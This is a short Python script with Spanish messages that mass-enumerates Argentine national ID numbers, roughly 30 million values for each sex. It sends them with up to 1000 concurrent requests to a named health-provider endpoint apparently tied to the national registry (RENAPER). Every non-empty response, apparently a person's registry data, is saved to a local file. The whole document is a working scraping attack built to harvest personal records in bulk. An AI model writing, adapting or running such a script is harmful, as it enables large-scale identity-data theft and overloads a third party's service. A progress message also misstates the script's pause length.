import os
import asyncio
import aiohttp
import time
from colorama import Fore

os.system('cls')

async def titocalderon(numero, sexo, carpeta, semaforo):
    try:
        url = f"https://hbi.acuariosalud.com/federador.asp?accion=renaper&nrodoc={numero}&sexo={sexo}"
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                if response.status == 200:
                    data = await response.text()
                    if data.strip():
                        nombre_archivo = os.path.join(carpeta, f"{numero}_{sexo}.txt")
                        async with semaforo:
                            # Sección crítica protegida por el semáforo
                            with open(nombre_archivo, "w", encoding="utf-8") as archivo:
                                archivo.write(data)
                            print(f"Operación {Fore.GREEN}exitosa{Fore.WHITE}: DNI {numero}, Sexo {sexo}. Guardado en el archivo: {Fore.CYAN}{nombre_archivo}{Fore.WHITE}")
                        return True
                else:
                    if "No existe Tito Calderon" in await response.text():
                        print(f"No existe Tito Calderon para DNI {numero}, Sexo {sexo}.")
                    else:
                        print(f"Operación {Fore.RED}fallida{Fore.WHITE}: DNI {numero}, Sexo {sexo}.")
                    return False
    except KeyboardInterrupt:
        print(f"{Fore.YELLOW}Interrupción de teclado. Saliendo del programa...{Fore.WHITE}")
        exit()

async def el_italiano(inicio, fin, sexos, carpeta_resultados, lote_size, conexiones_concurrentes):
    lote_actual = 0
    semaforo = asyncio.Semaphore(conexiones_concurrentes)

    tasks = []
    for _ in range(inicio, fin):
        numero = str(_).zfill(8)
        for sexo in sexos:
            if lote_actual == lote_size:
                lote_actual = 0
                print(f"{Fore.MAGENTA}\n\n\n\nHaciendo una pausa de 2 minutos...\n\n\n\n")
                await asyncio.sleep(60)

            task = titocalderon(numero, sexo, carpeta_resultados, semaforo)
            tasks.append(task)
            lote_actual += 1

            if len(tasks) >= conexiones_concurrentes:
                await asyncio.gather(*tasks)
                tasks = []

    await asyncio.gather(*tasks)

if __name__ == "__main__":
    carpeta_resultados = "ella_me_llama"
    os.makedirs(carpeta_resultados, exist_ok=True)

    sexos = ['M', 'F']
    inicio = 30046783 #lo cambie pa ta bien
    fin = 59999999
    lote_size = 500
    conexiones_concurrentes = 1000  # Ajusta este valor según tus necesidades

    asyncio.run(el_italiano(inicio, fin, sexos, carpeta_resultados, lote_size, conexiones_concurrentes))
